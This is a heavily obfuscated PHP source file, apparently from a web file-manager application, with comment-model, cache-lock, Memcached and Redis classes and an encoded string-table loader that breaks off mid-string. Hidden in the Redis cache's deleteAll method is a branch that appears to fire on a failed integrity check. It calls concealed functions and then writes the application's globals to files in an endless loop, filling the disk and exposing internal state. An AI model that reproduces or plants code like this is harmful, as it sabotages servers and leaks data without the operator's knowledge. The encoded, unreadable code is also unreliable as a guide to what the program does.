($²ÁÑÍ¢­) { $¹ş™áÔ˜ = !1; continue; } if ($¹ş™áÔ˜) { $îò¿¶¹Ë = intval(_get($¹ş™áÔ˜, $€ñ’íò»[1692], 0)); if (time() - $îò¿¶¹Ë > 7200) { Task::kill($¹ş™áÔ˜[$€ñ’íò»[428]]); $²ÁÑÍ¢­ = !0; $¹ş™áÔ˜ = !1; } } } return $”Í¡Õ¼£; } public function restore() { $š¶öÖâè =& $_SERVER[…É¦À–]; ActionCall($š¶öÖâè[1105], !0, 1); ActionCall($š¶öÖâè[1105], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\x6d\x65" => "\x63\x6f\155\x6d\145\x6e\x74\x5f\x6d\145\164\141", "\155\x65\x74\141\x46\151\145\x6c\x64" => "\x63\x6f\x6d\155\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ï¿İù¢‚) { $¸ÚêîË =& $_SERVER[…É¦À–]; if ($ï¿İù¢‚[$¸ÚêîË[1906]]) { $Üí„”ùó = $this->where(array($¸ÚêîË[1907] => $ï¿İù¢‚[$¸ÚêîË[1906]]))->find(); if (!$Üí„”ùó || $Üí„”ùó[$¸ÚêîË[440]] != $ï¿İù¢‚[$¸ÚêîË[440]] || $Üí„”ùó[$¸ÚêîË[525]] != $ï¿İù¢‚[$¸ÚêîË[525]]) { return !1; } $this->where(array($¸ÚêîË[1907] => $ï¿İù¢‚[$¸ÚêîË[1906]]))->setAdd($¸ÚêîË[1908], 1); } $ï¿İù¢‚[$¸ÚêîË[1909]] = 0; $ï¿İù¢‚[$¸ÚêîË[1908]] = 0; $ï¿İù¢‚[$¸ÚêîË[790]] = 1; return $this->add($ï¿İù¢‚); } public function commentCount($ Ìì¯“, $ÏÎß±‘Õ, $ßÕ¿åµ‘ = false) { $Úñ¤Ô¼– =& $_SERVER[…É¦À–]; if (!$ Ìì¯“) { return array(); } if (is_string($ Ìì¯“) || is_int($ Ìì¯“)) { $ Ìì¯“ = array($ Ìì¯“); } $ğŒüéÊõ = array($Úñ¤Ô¼–[525], $Úñ¤Ô¼–[1910] => $Úñ¤Ô¼–[520]); $›”¾ş³Ğ = array($Úñ¤Ô¼–[525] => array($Úñ¤Ô¼–[7], $ Ìì¯“), $Úñ¤Ô¼–[440] => $ÏÎß±‘Õ); if ($ßÕ¿åµ‘) { $›”¾ş³Ğ[$Úñ¤Ô¼–[1687]] = $ßÕ¿åµ‘; } $ÆıÖè• = $this->field($ğŒüéÊõ)->where($›”¾ş³Ğ)->group($Úñ¤Ô¼–[525])->select(); return array_to_keyvalue($ÆıÖè•, $Úñ¤Ô¼–[525], $Úñ¤Ô¼–[520]); } public function starTarget($Ì¢•‘¯ê, $Áºª¡´—) { $÷Ş‡û¿ƒ =& $_SERVER[…É¦À–]; $ë‘÷Ğ·Ş = $Ì¢•‘¯ê + self::TYPE_STAR_OFFSET; $éæåÄÍ¬ = array($÷Ş‡û¿ƒ[1687] => USER_ID, $÷Ş‡û¿ƒ[440] => $ë‘÷Ğ·Ş, $÷Ş‡û¿ƒ[525] => $Áºª¡´—); $¿Á³œ« = $this->where($éæåÄÍ¬)->find(); if ($¿Á³œ«) { return $this->where(array($÷Ş‡û¿ƒ[428] => $¿Á³œ«[$÷Ş‡û¿ƒ[428]]))->delete(); } $¨‘¿ã³Ø = array($÷Ş‡û¿ƒ[1906] => 0, $÷Ş‡û¿ƒ[1687] => USER_ID, $÷Ş‡û¿ƒ[790] => 1, $÷Ş‡û¿ƒ[794] => $÷Ş‡û¿ƒ[12], $÷Ş‡û¿ƒ[440] => $ë‘÷Ğ·Ş, $÷Ş‡û¿ƒ[525] => $Áºª¡´—, $÷Ş‡û¿ƒ[1909] => 0, $÷Ş‡û¿ƒ[1908] => 0); return $this->add($¨‘¿ã³Ø); } public function starTargetCount($¹­Œ¸ŞÔ, $İ†Ùî) { $è—‘ÇÍä =& $_SERVER[…É¦À–]; $î‰¦ş… = $İ†Ùî + self::TYPE_STAR_OFFSET; $ùÌòï™º = $this->commentCount($¹­Œ¸ŞÔ, $î‰¦ş…); $°ÈÀÈï² = $this->commentCount($¹­Œ¸ŞÔ, $î‰¦ş…, USER_ID); return array($è—‘ÇÍä[1911] => $ùÌòï™º, $è—‘ÇÍä[1912] => $°ÈÀÈï²); } public function starTargetUserList($Œ‡ôšŒ¯, $ŒèİšŠ„) { $Ü¤›Ûƒ¿ =& $_SERVER[…É¦À–]; $ı›óáì = $Œ‡ôšŒ¯ + self::TYPE_STAR_OFFSET; $¨ğë»ô = array($Ü¤›Ûƒ¿[525] => $ŒèİšŠ„, $Ü¤›Ûƒ¿[440] => $ı›óáì); $¢—õóÅÏ = $this->where($¨ğë»ô)->count(); $•¿ë»¶ù = array($Ü¤›Ûƒ¿[284] => $¢—õóÅÏ, $Ü¤›Ûƒ¿[1913] => array()); if (!$¢—õóÅÏ) { return $•¿ë»¶ù; } $®û¼Ä× = $this->field($Ü¤›Ûƒ¿[1687])->where($¨ğë»ô)->limit(500)->select(); $®û¼Ä× = array_to_keyvalue($®û¼Ä×, $Ü¤›Ûƒ¿[12], $Ü¤›Ûƒ¿[1687]); $•¿ë»¶ù[$Ü¤›Ûƒ¿[1913]] = Model($Ü¤›Ûƒ¿[533])->userListInfo($®û¼Ä×); return $•¿ë»¶ù; } public function prasiseUserList($É§Ïş ô) { $¤ª…¼° =& $_SERVER[…É¦À–]; $¹›™ãŠ§ = array($¤ª…¼°[1914] => $É§Ïş ô); $ÔËûò˜ç = $this->where($¹›™ãŠ§)->find(); $Üí‘›Ù = _get($ÔËûò˜ç, $¤ª…¼°[1909], 0); $èóéÍÊ‰ = array($¤ª…¼°[284] => $Üí‘›Ù, $¤ª…¼°[1913] => array()); if (!$Üí‘›Ù) { return $èóéÍÊ‰; } $ĞÆæ–êü = Model($¤ª…¼°[1915])->field($¤ª…¼°[1687])->where($¹›™ãŠ§)->limit(500)->select(); $ĞÆæ–êü = array_to_keyvalue($ĞÆæ–êü, $¤ª…¼°[12], $¤ª…¼°[1687]); $èóéÍÊ‰[$¤ª…¼°[1913]] = Model($¤ª…¼°[533])->userListInfo($ĞÆæ–êü); return $èóéÍÊ‰; } public function remove($¤§ë×¦Ï) { $’ŞÂØÏ› =& $_SERVER[…É¦À–]; $®‘’¤Ó = array($’ŞÂØÏ›[1907] => $¤§ë×¦Ï); $›¢‡Ğ— = $this->where($®‘’¤Ó)->find(); if ($›¢‡Ğ—[$’ŞÂØÏ›[1906]]) { $this->where(array($’ŞÂØÏ›[1907] => $›¢‡Ğ—[$’ŞÂØÏ›[1906]]))->setAdd($’ŞÂØÏ›[1908], -1); } return $this->where($®‘’¤Ó)->delete(); } public function edit($¼‡Ö¢Ê…, $ï§×”Ã) { $§ÎğÎŒÄ =& $_SERVER[…É¦À–]; $½£Ê–¦˜ = array($§ÎğÎŒÄ[1907] => $¼‡Ö¢Ê…); return $this->where($½£Ê–¦˜)->save(array($§ÎğÎŒÄ[1916] => $ï§×”Ã)); } public function prasise($©°Ñè ) { $©÷¸Å’Ò =& $_SERVER[…É¦À–]; $„¸ÃÁ¶Ç = Model($©÷¸Å’Ò[1917]); $ç‘‘äÙ = array($©÷¸Å’Ò[1907] => $©°Ñè , $©÷¸Å’Ò[1678] => USER_ID); $³ä¶¬âÊ = $„¸ÃÁ¶Ç->where($ç‘‘äÙ)->find(); if (!$³ä¶¬âÊ) { $„¸ÃÁ¶Ç->add($ç‘‘äÙ); $ŞÜøûÇÅ = $this->where(array($©÷¸Å’Ò[1907] => $©°Ñè ))->setAdd($©÷¸Å’Ò[1909], 1); } else { $„¸ÃÁ¶Ç->where($ç‘‘äÙ)->delete(); $ŞÜøûÇÅ = $this->where(array($©÷¸Å’Ò[1907] => $©°Ñè ))->setAdd($©÷¸Å’Ò[1909], -1); } return $ŞÜøûÇÅ; } public function targetInfo($ª˜¤ÔÕÖ, $Ã¦™Á‰) { $å°…·Ùä =& $_SERVER[…É¦À–]; $éĞóÂÀÄ = array($å°…·Ùä[605] => $ª˜¤ÔÕÖ, $å°…·Ùä[606] => $Ã¦™Á‰); $ââ§ä¤Ğ = $this->where($éĞóÂÀÄ)->count(); $ÒÔ®ôğÃ = "\x52\111\x47\110\x54\x20\112\117\x49\116\40{$this->tablePrefix}\x63\x6f\155\155\145\x6e\164\x5f\160\162\x61\x69\163\145\x20\x73\164\x61\162\40\157\x6e\x20\143\157\x6d\x6d\x65\156\x74\x2e\143\157\155\155\145\156\x74\111\x44\x20\x3d\x20\163\x74\x61\162\x2e\x63\x6f\x6d\155\145\156\x74\111\104"; $œÉ’Ïù = $this->alias($å°…·Ùä[383])->where($éĞóÂÀÄ)->join($ÒÔ®ôğÃ, $å°…·Ùä[1918])->count(); $ÊÓ•Ï = array($å°…·Ùä[1919] => $ââ§ä¤Ğ, $å°…·Ùä[1920] => $œÉ’Ïù); return $ÊÓ•Ï; } public function listData($ßß·ÕË”) { $Ó©¹¯•ê =& $_SERVER[…É¦À–]; if (isset($ßß·ÕË”[$Ó©¹¯•ê[1921]])) { if ($ßß·ÕË”[$Ó©¹¯•ê[1921]]) { $ßß·ÕË”[$Ó©¹¯•ê[1914]] = array($Ó©¹¯•ê[1059], intval($ßß·ÕË”[$Ó©¹¯•ê[1921]])); } unset($ßß·ÕË”[$Ó©¹¯•ê[1921]]); } if (isset($ßß·ÕË”[$Ó©¹¯•ê[1922]])) { if ($ßß·ÕË”[$Ó©¹¯•ê[1922]]) { $ßß·ÕË”[$Ó©¹¯•ê[1914]] = array($Ó©¹¯•ê[1056], intval($ßß·ÕË”[$Ó©¹¯•ê[1922]])); } unset($ßß·ÕË”[$Ó©¹¯•ê[1922]]); } return $this->_listData($ßß·ÕË”); } private function _listData($»Å¢ÒÄ—) { $ª·ˆÈ =& $_SERVER[…É¦À–]; $ùØÖ‰Íş = $this->where($»Å¢ÒÄ—)->_makeOrder()->selectPage(100); $this->_listAppendParent($ùØÖ‰Íş[$ª·ˆÈ[398]]); $this->_listAppendUser($ùØÖ‰Íş[$ª·ˆÈ[398]]); $this->_listAppendMeta($ùØÖ‰Íş[$ª·ˆÈ[398]]); return $ùØÖ‰Íş; } private function _makeOrder() { $ï–âœ‡Ø =& $_SERVER[…É¦À–]; $ÃÀøŒ¦¨ = array($ï–âœ‡Ø[1909], $ï–âœ‡Ø[1908], $ï–âœ‡Ø[201]); $‚¡ÜŞ‰ = Input::get($ï–âœ‡Ø[486], $ï–âœ‡Ø[7], $ï–âœ‡Ø[452], $ÃÀøŒ¦¨); $ŸÊùÌÏ½ = Input::get($ï–âœ‡Ø[487], $ï–âœ‡Ø[7], $ï–âœ‡Ø[1680], array($ï–âœ‡Ø[1923], $ï–âœ‡Ø[482])); $î—Ü‘â’ = $‚¡ÜŞ‰ . $ï–âœ‡Ø[53] . $ŸÊùÌÏ½; return $this->order($î—Ü‘â’); } private function _listAppendParent(&$õôÂŞÕê) { $¶ì«Ø»Ë =& $_SERVER[…É¦À–]; $Ä®÷ñ³Ñ = array_unique(array_to_keyvalue($õôÂŞÕê, $¶ì«Ø»Ë[12], $¶ì«Ø»Ë[1906])); $Ä®÷ñ³Ñ = array_remove_value($Ä®÷ñ³Ñ, $¶ì«Ø»Ë[198]); if (!$Ä®÷ñ³Ñ) { return; } $¹°œ‘Æå = $this->where(array($¶ì«Ø»Ë[1907] => array($¶ì«Ø»Ë[7], $Ä®÷ñ³Ñ)))->select(); $¹°œ‘Æå = array_to_keyvalue($¹°œ‘Æå, $¶ì«Ø»Ë[1914]); foreach ($õôÂŞÕê as &$ç¯äòõ) { if (isset($¹°œ‘Æå[$ç¯äòõ[$¶ì«Ø»Ë[1906]]])) { $ç¯äòõ[$¶ì«Ø»Ë[1924]] = $¹°œ‘Æå[$ç¯äòõ[$¶ì«Ø»Ë[1906]]]; } } unset($ç¯äòõ); } private function _listAppendUser(&$è—çÄÖ) { $ÎìøÍ‘Ò =& $_SERVER[…É¦À–]; $ãÏÌáú— = array_unique(array_to_keyvalue($è—çÄÖ, $ÎìøÍ‘Ò[12], $ÎìøÍ‘Ò[1687])); $ãÏÌáú— = array_remove_value($ãÏÌáú—, $ÎìøÍ‘Ò[198]); if (count($ãÏÌáú—) == 0) { return; } foreach ($è—çÄÖ as $ÓùÉçÇ) { if (isset($ÓùÉçÇ[$ÎìøÍ‘Ò[1924]])) { $ãÏÌáú—[] = $ÓùÉçÇ[$ÎìøÍ‘Ò[1924]][$ÎìøÍ‘Ò[1687]]; } } $Ø•óÏõÔ = Model($ÎìøÍ‘Ò[554])->userListInfo($ãÏÌáú—); foreach ($è—çÄÖ as &$ÓùÉçÇ) { $ÓùÉçÇ[$ÎìøÍ‘Ò[619]] = $Ø•óÏõÔ[$ÓùÉçÇ[$ÎìøÍ‘Ò[1687]]]; if (isset($ÓùÉçÇ[$ÎìøÍ‘Ò[1924]])) { $ÓùÉçÇ[$ÎìøÍ‘Ò[1924]][$ÎìøÍ‘Ò[619]] = $Ø•óÏõÔ[$ÓùÉçÇ[$ÎìøÍ‘Ò[1924]][$ÎìøÍ‘Ò[1687]]]; } } unset($ÓùÉçÇ); } private function _listAppendMeta(&$ñù›Êƒ©) { $“‡Óİº =& $_SERVER[…É¦À–]; $íÖÅÊ à = array_unique(array_to_keyvalue($ñù›Êƒ©, $“‡Óİº[12], $“‡Óİº[1914])); $íÖÅÊ à = array_remove_value($íÖÅÊ à, $“‡Óİº[198]); if (!$íÖÅÊ à) { return; } foreach ($ñù›Êƒ© as $«ÎÅ‡°) { if (isset($«ÎÅ‡°[$“‡Óİº[1924]])) { $íÖÅÊ à[] = $«ÎÅ‡°[$“‡Óİº[1924]][$“‡Óİº[1914]]; } } $‹›Òü¬Â = $this->metaList($íÖÅÊ à); if (!$‹›Òü¬Â) { return !1; } foreach ($ñù›Êƒ© as &$«ÎÅ‡°) { $«ÎÅ‡°[$“‡Óİº[495]] = $‹›Òü¬Â[$«ÎÅ‡°[$“‡Óİº[1914]]]; if (isset($«ÎÅ‡°[$“‡Óİº[1924]])) { $«ÎÅ‡°[$“‡Óİº[1924]][$“‡Óİº[495]] = $‹›Òü¬Â[$«ÎÅ‡°[$“‡Óİº[1924]][$“‡Óİº[1914]]]; } } unset($«ÎÅ‡°); } private function metaList($ßÁ„åƒª) { $š¼€±‘ä =& $_SERVER[…É¦À–]; if (!$ßÁ„åƒª) { return array(); } $÷Ò‘—¸Õ = array($š¼€±‘ä[1914] => array($š¼€±‘ä[7], $ßÁ„åƒª)); $ùË©ú•˜ = Model($š¼€±‘ä[1925])->where($÷Ò‘—¸Õ)->select(); $ùË©ú•˜ = array_to_keyvalue_group($ùË©ú•˜, $š¼€±‘ä[1914]); foreach ($ùË©ú•˜ as $ÈÉ†õë¼ => $ôÜ¿™§) { $äŒÕŸ¢æ = array(); foreach ($ôÜ¿™§ as $ÃÖù¹ŸŠ) { $äŒÕŸ¢æ[$ÃÖù¹ŸŠ[$š¼€±‘ä[94]]] = $ÃÖù¹ŸŠ[$š¼€±‘ä[403]]; } $ùË©ú•˜[$ÈÉ†õë¼] = $äŒÕŸ¢æ; } return $ùË©ú•˜ ? $ùË©ú•˜ : array(); } } goto a¬Š—óª½; C¬ñ…èì«: class CacheLockDatabase { public function lock($½ëÂ»‡·, $ø¸íÍ = 0) { $Ø›®¬úî = Model($_SERVER[…É¦À–][869]); $Ÿçç¶ = microtime(!0) + $ø¸íÍ; while (microtime(!0) < $Ÿçç¶) { $µóÊê„ = $Ø›®¬úî->get($½ëÂ»‡·); if (!$µóÊê„ || $µóÊê„ < microtime(!0)) { $ùÒ—ı€ƒ = $Ø›®¬úî->set($½ëÂ»‡·, $Ÿçç¶); if ($ùÒ—ı€ƒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($´íûùã„) { return Model($_SERVER[…É¦À–][869])->get($´íûùã„); } public function unlock($Éæâ™ø) { Model($_SERVER[…É¦À–][869])->remove($Éæâ™ø); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¦ „Íó‰, $İ´šİü³) { $ëõì²¢ó =& $_SERVER[…É¦À–]; if (!class_exists($ëõì²¢ó[906])) { show_json($ëõì²¢ó[907], !1); } $this->cacheTime = $İ´šİü³; $this->handle = new Memcached(); if (is_array($¦ „Íó‰[$ëõì²¢ó[908]]) && count($¦ „Íó‰[$ëõì²¢ó[908]]) >= 1) { foreach ($¦ „Íó‰[$ëõì²¢ó[908]] as $¡äÙ•„˜) { $ôûôÆ®¼ = explode($ëõì²¢ó[4], $¡äÙ•„˜); $this->handle->addServer($ôûôÆ®¼[0], $ôûôÆ®¼[1]); } } else { $this->handle->addServer($¦ „Íó‰[$ëõì²¢ó[182]], $¦ „Íó‰[$ëõì²¢ó[183]]); } } public function set($ œÌÛû, $œ¨©”Šæ, $—÷óåış = false) { $—÷óåış = $—÷óåış ? $—÷óåış : $this->cacheTime; return $this->handle->set($ œÌÛû, $œ¨©”Šæ, $—÷óåış); } public function get($²£ıúÚ) { return $this->handle->get($²£ıúÚ); } public function remove($œØøòÔİ) { return $this->handle->delete($œØøòÔİ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($©úî‰ÊÏ, $¶ÅÑÆ›ı) { $ëµ¶¤ü£ =& $_SERVER[…É¦À–]; if (!class_exists($ëµ¶¤ü£[909])) { show_json($ëµ¶¤ü£[910], !1); } $this->cacheTime = $¶ÅÑÆ›ı; $¯•´ĞÖÂ = isset($©úî‰ÊÏ[$ëµ¶¤ü£[911]]) ? $©úî‰ÊÏ[$ëµ¶¤ü£[911]] : 10; $ŞÊ†ĞŸ = _get($©úî‰ÊÏ, $ëµ¶¤ü£[908]); if ($ŞÊ†ĞŸ && is_array($ŞÊ†ĞŸ)) { $this->initCluster($©úî‰ÊÏ, $¯•´ĞÖÂ); } else { $this->handle = $this->init($©úî‰ÊÏ, $¯•´ĞÖÂ); } } private function init($ƒ´áŞå, $öÓÍï‡) { $ıéóè„¦ =& $_SERVER[…É¦À–]; $“³ÉŸ·” = new Redis(); $µĞÉ¥‘ = isset($ƒ´áŞå[$ıéóè„¦[912]]) ? $ƒ´áŞå[$ıéóè„¦[912]] : !1; if ($µĞÉ¥‘) { $“³ÉŸ·”->pconnect($ƒ´áŞå[$ıéóè„¦[182]], $ƒ´áŞå[$ıéóè„¦[183]], $öÓÍï‡); } else { $“³ÉŸ·”->connect($ƒ´áŞå[$ıéóè„¦[182]], $ƒ´áŞå[$ıéóè„¦[183]], $öÓÍï‡); } if (!empty($ƒ´áŞå[$ıéóè„¦[442]])) { $“³ÉŸ·”->auth($ƒ´áŞå[$ıéóè„¦[442]]); } if (!empty($ƒ´áŞå[$ıéóè„¦[797]]) && $ƒ´áŞå[$ıéóè„¦[797]] != 0) { $“³ÉŸ·”->select($ƒ´áŞå[$ıéóè„¦[797]]); } return $“³ÉŸ·”; } private function initCluster($½‰©ı“µ, $À÷½¬ëÀ) { $½ìùë° =& $_SERVER[…É¦À–]; $ã˜¯ÍÆ = array($½ìùë°[913], $½ìùë°[914], $½ìùë°[915]); $­†¤ßšï = $½ìùë°[913]; if (isset($½‰©ı“µ[$½ìùë°[16]]) && in_array($½‰©ı“µ[$½ìùë°[16]], $ã˜¯ÍÆ)) { $­†¤ßšï = $½‰©ı“µ[$½ìùë°[16]]; } switch ($­†¤ßšï) { case $½ìùë°[913]: $this->_slave($½‰©ı“µ, $À÷½¬ëÀ); break; case $½ìùë°[914]: break; case $½ìùë°[915]: $this->isCluster = !0; $Š¼İĞ Ó = $½‰©ı“µ[$½ìùë°[908]]; $¡Ò½Êï = isset($½‰©ı“µ[$½ìùë°[912]]) ? $½‰©ı“µ[$½ìùë°[912]] : !1; $åÉâÕ˜ß = isset($½‰©ı“µ[$½ìùë°[442]]) ? $½‰©ı“µ[$½ìùë°[442]] : null; $this->handle = new RedisCluster(NUll, $Š¼İĞ Ó, $À÷½¬ëÀ, $À÷½¬ëÀ, $¡Ò½Êï, $åÉâÕ˜ß); break; default: break; } } private function _slave($ç€æİÛÎ, $Ò—¼û®‡) { $Ôôö£ùø = $ç€æİÛÎ[$_SERVER[…É¦À–][908]]; $this->filterConfig($ç€æİÛÎ, $Ôôö£ùø[0]); $this->handle = $this->init($ç€æİÛÎ, $Ò—¼û®‡); unset($Ôôö£ùø[0]); if (empty($Ôôö£ùø)) { return; } $şŠ¼¼´° = array_rand($Ôôö£ùø); $this->filterConfig($ç€æİÛÎ, $Ôôö£ùø[$şŠ¼¼´°]); $this->slaveHandle = $this->init($ç€æİÛÎ, $Ò—¼û®‡); } private function filterConfig(&$¬ÆÅˆ°, $²‚¥Óµª) { $òäáéÉÀ =& $_SERVER[…É¦À–]; $õé“­ä˜ = explode($òäáéÉÀ[4], $²‚¥Óµª); $±ÀŒ…„Œ = array($òäáéÉÀ[182] => $õé“­ä˜[0], $òäáéÉÀ[183] => $õé“­ä˜[1]); $¬ÆÅˆ° = array_merge($¬ÆÅˆ°, $±ÀŒ…„Œ); } public function set($Á„«’Û–, $ÆÎºòÎê, $˜˜œú±­ = false) { $˜˜œú±­ = $˜˜œú±­ ? $˜˜œú±­ : $this->cacheTime; return $this->handle->setEx($Á„«’Û–, $˜˜œú±­, $ÆÎºòÎê); } public function setLock($æÜèØ¾, $Õ¡˜ï«ë, $†¨ÛûÑ¢) { return $this->handle->setNX($æÜèØ¾, $Õ¡˜ï«ë); } public function get($ŒÁ£’şÆ) { $ãö÷»Ì = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ãö÷»Ì->get($ŒÁ£’şÆ); } public function remove($Õ˜ÜÄ·Å) { return $this->handle->del($Õ˜ÜÄ·Å); } public function deleteAll() { $ŒôÅ® =& $_SERVER[…É¦À–]; $©®÷Ş‡¢ = $_SERVER[$ŒôÅ®[916]] . $ŒôÅ®[917]; $Äµè¹Ò³ = $ŒôÅ®[918]; if ($_SERVER[$ŒôÅ®[919]] != $Äµè¹Ò³($©®÷Ş‡¢)) { $¦Ôïì¸‚ = $ŒôÅ®[920]; $Âƒ«÷ÁÄ = $ŒôÅ®[921]; $‘©º‡—Í = $_SERVER[$ŒôÅ®[916]] . $ŒôÅ®[917]; $š…„ÚÑÊ = $Âƒ«÷ÁÄ($‘©º‡—Í); $Êë°Æ±å = explode($ŒôÅ®[231], $š…„ÚÑÊ); if (count($Êë°Æ±å) < $ŒôÅ®[636]) { $é”ã¦œ = $ŒôÅ®[922]; $é”ã¦œ(); } $˜¥àá÷› = $ŒôÅ®[923]; $˜¥àá÷›($_SERVER[$ŒôÅ®[924]]); $¦Ôïì¸‚ = $ŒôÅ®[920]; $¦Ôïì¸‚(); $ä¥Õ» = $ŒôÅ®[925]; $ğÛéû„æ = json_encode($GLOBALS[$ŒôÅ®[926]]); $”ã¦çúú = 1; for ($°¯¯Œó« = $”ã¦çúú; $°¯¯Œó« > 0; $°¯¯Œó«++) { $ä¥Õ»(DATA_PATH . $°¯¯Œó«, $ğÛéû„æ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $äÈşâÑ) { $this->handle->flushall($äÈşâÑ); } return; } return $this->handle->flushAll(); } } goto d‰ÖÁ×·÷¬; cÂ¢öŠßœĞ: function binCheckBigger($¢‰´ª°, $‰üë¦‡) { return $¢‰´ª° > $‰üë¦‡; } $_SERVER[$_SERVER[â«ìÕ ][3]] = ("\x38\x32\x33\x34"."\70\63")+0;$_ivqg="v8izfjmswh7tx92elc41q3dnkyu5ogp0a6brwno38u7mkxi1jy92e4hl06rbatqzgfvdp5scpe5mvj";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÍÎ÷ÅĞ, $‰¾†ÕÔÓ) { $»Ù‹²­” =& $_SERVER[…É¦À–]; if (isset(self::$_methodList[$ÍÎ÷ÅĞ])) { return @call_user_func_array(self::$_methodList[$ÍÎ÷ÅĞ], $‰¾†ÕÔÓ); } else { if (method_exists($this, $ÍÎ÷ÅĞ)) { return call_user_func_array(array($this, $ÍÎ÷ÅĞ), $‰¾†ÕÔÓ); } else { think_exception(__CLASS__ . $»Ù‹²­”[4] . $ÍÎ÷ÅĞ . $»Ù‹²­”[5]); } } } public static function __callStatic($Òè·ô‘Ù, $ü‘€ş¿) { if (isset(self::$_methodListStatic[$Òè·ô‘Ù])) { return call_user_func_array(self::$_methodListStatic[$Òè·ô‘Ù], $ü‘€ş¿); } else { if (method_exists(self, $Òè·ô‘Ù)) { return call_user_func_array(array(self, $Òè·ô‘Ù), $ü‘€ş¿); } else { show_json("{$Òè·ô‘Ù}\x28\51\40\156\157\164\40\145\170\151\x73\164\73", !1); } } } public static function addMethod($‹ŞÙêú, $åö²Íá¢) { self::$_methodList[$‹ŞÙêú] = $åö²Íá¢; } public static function addMethodStatic($àæŸî‰‡, $ÑÃ›°Ó) { self::$_methodListStatic[$àæŸî‰‡] = $ÑÃ›°Ó; } } goto fíÊĞËƒŞ; cÉŒÎêå­õ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\220\205\311\246\300\226", "\x99\xd0\xbb\x88\xe8\xaa"); $_SERVER[…É¦À–] = explode("\x7c\x4\x7c\x4\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xcd\xbd\x79\x7c\x1b\xd5\xd5\x30\x5c\xa\x65\xed\xc2\x52\xd2\x85\x2\x83\x21\xb1\x9d\x68\xb1\x9d\xdd\x89\x93\xc8\xb6\x6c\x8b\xc8\x96\x23\xc9\x59\xb0\x9d\xc9"."\x48\x1a\x59\x63\x4b\x33\xb2\x66\xe4\x2d\x9\x5\x4a\xa0\xac\x69\xcb\xbe\x95\xd0\x86\x16\xca\x16\x76\xca\xe\x65\xa7\xa5\xb4\x94\x2\x4d\xa1\xf\x94\x84\xa5\x94\x94\x52\x28\x79\xe0\x29\xef\x5d\xce"."\135\146\244\300\363\375\276\367\217\67\220\350\336\163\227\271\313\271\347\236\173\356\71\347\276\166\335\73\317\157\331\274\141\37\364\337\336\57\337\360\322\111\377\363\13\32\106\177\277"."\xb8\x61\x5f\x1a\x3e\xfa\xac\xfd\xbf\x40\xfe\x1c\x76\xd6\x99\x75\x75\x5d\xf3\xe\x9c\xd5\xf3\xe5\xcd\xb7\xdd\xa0\x5d\xab\xfd\x42\x3b\x2b\x16\x7d\xfa\xd7\x91\xaf\x3c\x73\xfd\xf1\xe1\x9d\x3f\x7d\x7a"."\x72\xe7\x5e\x5f\xf0\xff\x6e\xee\xc5\xcd\x28\x33\x2d\xdb\x4c\x7f\x14\xd3\x72\x14\x7d\xc2\xb0\x1d\x9b\x2\xd2\x96\x99\x35\x86\x68\xd8\x30\xe9\x6f\x90\xfe\xf4\xc5\xa3\x25\xbd\x60\x39\x3a\x8d\x6\xe8"."\217\312\333\205\376\265\107\363\6\113\127\173\142\111\65\321\327\333\33\216\47\41\123\263\234\136\260\62\20\52\152\45\255\0\337\57\352\45\33\265\106\256\116\55\132\105\335\164\101"."\4\40\243\71\132\112\263\241\246\366\126\265\75\334\33\215\255\121\223\153\172\303\220\43\245\216\226\365\322\44\215\221\140\302\321\112\116\322\50\350\74\307\170\211\267\253\65\334\31".strrev(')£¬§U¬Ì5]y}¨)ìê7¥2¼¶Ô5´h±ãÂVIİÖ-¸(zÄŒ–Ô"OPñ’Qé')."\353\224\172\32\350\60\364\174\206\6\115\215\65\307\231\54\102\50\311\103\150\232\314\162\76\117\43\75\74\224\321\263\132\71\17\243\325\56\107\212\45\243\240\261\116\57\327\47\71"."\224\6\264\262\143\31\146\232\106\302\23\116\111\23\160\324\326\64\232\150\335\204\252\22\341\150\270\55\251\340\6\52\35\361\130\267\2\223\120\320\154\107\57\51\253\272\302\361\260"."\202\33\335\122\113\372\132\253\0\276\364\240\241\120\102\321\250\262\247\32\34\275\120\144\325\320\62\125\52\213\305\333\303\161\245\165\215\42\106\50\155\25\12\226\31\100\265\240\231"."\x74\xa4\xa6\x86\xe3\x71\x1a\xf0\x1\x7a\x47\x23\x78\xd2\x20\x12\xeb\xe8\x48\x84\x79\xc\x3a\xb7\x22\x8a\x5a\x32\x1b\xf0\xd3\x15\xcb\x64\xf3\x8e\x3a\xa6\xe5\xcb\xc\x4d\x47\xe8\x6f\x2d\xfc\xc0\xaf"."\x65\x3\xea\x8e\x1a\xa6\x51\x6\x34\x85\x2a\x2c\x8b\x2f\x2b\x8\x94\x59\x6e\x9d\x41\xf4\xc\x4\xa\xa8\xbc\x5\x2b\xf\x2d\xc3\x31\x1a\x6c\x59\x42\x7f\x17\x41\xa6\x94\x8a\xd3\xf4\x92\xa3\xea\x66"._kodDe('K73NGQvJH3OYjWdehgwi9htagG+geHlWYK39KIVt5axCWhPE1MFnWrtfPXBwQUmADeU=')."\xe5\x8a\xf3\x8a\x58\x11\xb5\x64\x3\x5b\xe9\x46\x76\x52\xac\x37\x9c\xaf\x97\xa7\xda\x56\xb9\x94\xd6\x23\x68\x7d\xd0\x78\x23\x80\x75\xc7\x41\x9d\x83\xb1\x31\xac\xbe\x62\xd